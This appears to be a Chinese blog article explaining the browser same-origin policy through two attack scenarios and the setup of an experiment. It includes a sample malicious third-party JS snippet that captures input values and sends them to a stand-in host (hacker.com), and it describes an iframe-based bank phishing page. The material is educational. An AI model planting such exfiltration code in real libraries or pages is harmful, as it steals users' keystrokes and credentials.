---
title: 同源策略
---

<p class="lead">
	本文讨论浏览器上的同源策略，分析同源策略已解决的问题，以及目前还存在什么问题。
</p>

首先，我们先不看什么是同源策略，先来想一些可能的web安全方面的隐患：

* **情景1：**假如我写了一个通用的js库，被很多开发者引用，但他们不知道我在里面偷偷加了一些恶意代码：getInputValAndSendToDB()。这个方法的主要功能是监听用户的键盘输入，并将输入的值通过ajax或JSONP等形式发送到我的服务器并存储到数据库中。

代码看起来可能像这样：
{% highlight js %}
var other = (function () {
    var getInputValAndSendToDB = function() {
        $('#text').on('change', function () {
            var val = $(this).val();
            send(val);
        });
    }
    var send = function (data) {
        $.get('http://www.hacker.com/?data=' + data, function (data) {
            console.log('来自第三方JS库的消息:');
            console.log(data);
        });
    };
    $(function () {
        getInputValAndSendToDB();
    });
})();
{% endhighlight %}

* **情景2：**再假如我写了一个html页面，里面只有个iframe元素，src属性设置为某个银行主页的地址。我还申请了一个和该银行主页类似的域名，最后将页面部署到Internet上。当有人打开这个页面，他们看到的内容和真正打开银行主页所看到的内容没有任何差别，但他们不知道其实我还在页面中加入了一段js代码，例如上面的getInputValAndSendToDB方法，监听银行主页的用户名input以及密码input，或者将银行页面中的某个链接的href属性改成其它钓鱼网站的地址，诱使用户在钓鱼网站上输入他们的用户名、密码、银行卡号等信息。

好，现在我们有了两个情景，那这两种情景是否有可能浏览器中发生呢？接下来我们通过实验的方式来验证一下吧。

实验方案：

* 环境：使用nodejs启动两个服务，我这里分别监听了8110(开发者)和8111(第三方JS库提供者)端口
* 开发者: 引用第三方提供的JS库: other.js。页面中放置一个input标签
* 第三方: 提供other.js，并在other.js中写入情景1中提到的恶意代码
* 实验过程: 在开发者页面的input中输入值，看是否会被发送到第三方服务器





